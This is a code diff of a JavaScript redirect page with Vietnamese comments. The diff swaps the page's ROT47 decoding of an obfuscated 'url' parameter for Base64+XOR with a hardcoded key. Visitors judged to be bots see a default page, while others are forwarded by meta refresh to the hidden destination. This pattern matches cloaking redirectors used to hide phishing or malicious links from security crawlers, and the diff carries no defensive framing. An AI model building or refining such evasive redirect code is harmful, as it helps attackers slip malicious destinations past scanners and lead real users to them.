@@ -12,46 +12,38 @@
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
-        // Hàm giải mã Base64 + ROT47, xử lý kỹ hơn và kiểm tra Base64 cẩn thận
-        function decodeAdvanced(input) {
-            let rot47 = '';
-            for (let i = 0; i < input.length; i++) {
-                let code = input.charCodeAt(i);
-                if (code >= 33 && code <= 126) {
-                    rot47 += String.fromCharCode((code - 33 - 47 + 94) % 94 + 33);
-                } else {
-                    rot47 += input[i];
-                }
-            }
-            try {
-                // Lọc và chuẩn hóa chuỗi Base64, chỉ giữ ký tự hợp lệ
-                const cleanedRot47 = rot47.replace(/[^A-Za-z0-9+/=]/g, '');
-                const base64Pattern = /^[A-Za-z0-9+/]+={0,2}$/;
-                if (!base64Pattern.test(cleanedRot47)) {
-                    console.error("Invalid Base64 string after ROT47 (cleaned):", cleanedRot47);
-                    return '';
-                }
-                const decodedBase64 = atob(cleanedRot47);
-                return decodeURIComponent(decodedBase64); // Xử lý ký tự đặc biệt
-            } catch (e) {
-                console.error("Invalid encoded URL:", e, "Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
-                return '';
-            }
-        }
+        // Khóa mã hóa (giữ bí mật, không thay đổi nếu đã dùng)
+        const ENCRYPTION_KEY = 'xAI2025';
 
-        // Hàm mã hóa để kiểm tra (dùng nếu cần)
+        // Hàm mã hóa Base64 + XOR (dùng để tạo URL, không cần trong HTML)
         function encodeAdvanced(url) {
             let base64 = btoa(encodeURIComponent(url));
-            let rot47 = '';
+            let xorResult = '';
             for (let i = 0; i < base64.length; i++) {
-                let code = base64.charCodeAt(i);
-                if (code >= 33 && code <= 126) {
-                    rot47 += String.fromCharCode((code - 33 + 47) % 94 + 33);
-                } else {
-                    rot47 += base64[i];
-                }
+                let charCode = base64.charCodeAt(i);
+                let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
+                xorResult += String.fromCharCode(charCode ^ keyCode);
             }
-            return rot47;
+            return btoa(xorResult); // Mã hóa thêm một lần Base64 để dễ truyền
+        }
+
+        // Hàm giải mã Base64 + XOR
+        function decodeAdvanced(input) {
+            try {
+                // Giải mã Base64 đầu tiên
+                let base64 = atob(input);
+                let decoded = '';
+                for (let i = 0; i < base64.length; i++) {
+                    let charCode = base64.charCodeAt(i);
+                    let keyCode = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
+                    decoded += String.fromCharCode(charCode ^ keyCode);
+                }
+                // Giải mã Base64 cuối cùng để lấy URL
+                return decodeURIComponent(atob(decoded));
+            } catch (e) {
+                console.error("Invalid encoded URL:", e);
+                return '';
+            }
         }
 
         // Kiểm tra bot, giảm sai sót với người dùng thật
@@ -80,7 +72,7 @@
                     // Chuyển hướng tức thì qua thẻ meta
                     document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
                 } else {
-                    console.error("Failed to decode URL, showing default page. Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
+                    console.error("Failed to decode URL, showing default page.");
                 }
             } else {
                 console.log("Bot detected, not redirecting.");
